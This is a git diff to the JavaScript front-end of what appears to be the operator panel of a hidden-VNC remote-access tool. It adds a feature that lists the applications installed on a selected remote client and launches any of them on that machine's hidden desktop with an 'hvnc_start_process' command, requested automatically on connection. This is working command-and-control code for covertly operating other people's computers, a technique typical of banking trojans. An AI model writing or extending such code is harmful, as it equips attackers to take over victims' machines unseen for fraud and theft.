@@ -397,6 +397,94 @@ import { checkFeatureAccess } from "./feature-gate.js";
     sendCmd("hvnc_browser_check", {});
   }
 
+  const installedAppsLoading = document.getElementById("installedAppsLoading");
+  const installedAppsList = document.getElementById("installedAppsList");
+  const installedAppsGrid = document.getElementById("installedAppsGrid");
+  const installedAppsCount = document.getElementById("installedAppsCount");
+  const refreshInstalledApps = document.getElementById("refreshInstalledApps");
+  let installedAppsData = [];
+
+  let installedAppsLoading_pending = false;
+
+  function requestInstalledApps() {
+    installedAppsData = [];
+    installedAppsLoading_pending = true;
+    if (installedAppsLoading) installedAppsLoading.classList.remove("hidden");
+    if (installedAppsList) installedAppsList.classList.add("hidden");
+    if (installedAppsGrid) installedAppsGrid.innerHTML = "";
+    if (installedAppsCount) installedAppsCount.textContent = "";
+    sendCmd("hvnc_installed_apps", {});
+  }
+
+  if (refreshInstalledApps) {
+    refreshInstalledApps.addEventListener("click", (e) => {
+      e.stopPropagation();
+      requestInstalledApps();
+    });
+  }
+
+  function handleInstalledAppsResult(msg) {
+    if (!installedAppsGrid) return;
+    const apps = msg.apps || [];
+    const done = !!msg.done;
+
+    if (apps.length > 0) {
+      installedAppsData.push(...apps);
+      if (installedAppsLoading) installedAppsLoading.classList.add("hidden");
+      if (installedAppsList) installedAppsList.classList.remove("hidden");
+      if (installedAppsCount) installedAppsCount.textContent = `(${installedAppsData.length}${done ? "" : "…"})`;
+
+      for (const app of apps) {
+        appendAppButton(app);
+      }
+    }
+
+    if (done) {
+      installedAppsLoading_pending = false;
+      if (installedAppsLoading) installedAppsLoading.classList.add("hidden");
+      if (installedAppsList) installedAppsList.classList.remove("hidden");
+      if (installedAppsCount) installedAppsCount.textContent = `(${installedAppsData.length})`;
+      if (installedAppsData.length === 0) {
+        installedAppsGrid.innerHTML = '<div class="text-xs text-slate-600 text-center py-3">No apps found</div>';
+      }
+    }
+  }
+
+  function appendAppButton(app) {
+    const btn = document.createElement("button");
+    btn.type = "button";
+    btn.className = "installed-app-btn";
+    btn.title = app.exePath || app.name;
+
+    if (app.icon && /^[A-Za-z0-9+/=]+$/.test(app.icon)) {
+      const img = document.createElement("img");
+      img.src = "data:image/png;base64," + app.icon;
+      img.alt = "";
+      btn.appendChild(img);
+    } else {
+      const placeholder = document.createElement("span");
+      placeholder.className = "app-icon-placeholder";
+      placeholder.innerHTML = '<i class="fa-solid fa-cube"></i>';
+      btn.appendChild(placeholder);
+    }
+    const nameSpan = document.createElement("span");
+    nameSpan.className = "app-name";
+    nameSpan.textContent = app.name;
+    btn.appendChild(nameSpan);
+
+    btn.addEventListener("click", () => {
+      sendCmd("hvnc_start_process", { path: '"' + app.exePath + '"' });
+      hideContextMenu();
+    });
+    installedAppsGrid.appendChild(btn);
+  }
+
+  function escapeHtml(str) {
+    const div = document.createElement("div");
+    div.textContent = str;
+    return div.innerHTML;
+  }
+
   function sendCmd(type, payload) {
     if (!activeClientId) {
       console.warn("No active client selected");
@@ -786,6 +874,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
         handleBrowserCheckResult(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_installed_apps_result") {
+        handleInstalledAppsResult(msg);
+        return;
+      }
       if (msg && msg.type === "hvnc_dxgi_status") {
         handleDXGIStatus(msg);
         return;
@@ -819,6 +911,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
     }
     if (msg && msg.type === "hvnc_browser_check_result") {
       handleBrowserCheckResult(msg);
+      return;
+    }
+    if (msg && msg.type === "hvnc_installed_apps_result") {
+      handleInstalledAppsResult(msg);
       return;
     }
     if (msg && msg.type === "hvnc_dxgi_status") {
@@ -860,6 +956,9 @@ import { checkFeatureAccess } from "./feature-gate.js";
       }
     });
     requestBrowserCheck();
+    if (!installedAppsLoading_pending && installedAppsData.length === 0) {
+      requestInstalledApps();
+    }
   }
 
   function onWsClose() {
